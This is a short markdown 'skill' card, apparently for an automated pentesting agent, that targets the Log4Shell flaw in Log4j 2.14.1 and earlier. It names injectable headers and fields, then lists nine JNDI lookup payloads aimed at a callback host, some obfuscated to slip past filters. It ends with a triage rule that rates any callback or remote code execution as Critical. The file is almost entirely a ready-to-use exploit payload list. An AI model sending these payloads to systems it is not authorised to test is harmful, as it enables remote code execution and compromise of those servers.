# SKILL: log4shell
## Trigger
Java + Log4j ≤ 2.14.1. Any log-stored field: User-Agent, Referer, X-Api-Version, search, contact.
## Payloads
${jndi:ldap://xxx.burpcollaborator.net/a}
${jndi:ldap://x${hostName}.L4J.canarytokens.com/a}
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://collab/a}
${${::-j}ndi:rmi://collab/ass}
${jndi:rmi://collab}
${${lower:jndi}:${lower:rmi}://collab/poc}
${${lower:${lower:jndi}}:${lower:rmi}://collab/poc}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://collab/poc}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://collab/poc
## Triage
Callback → Critical. RCE → Critical.
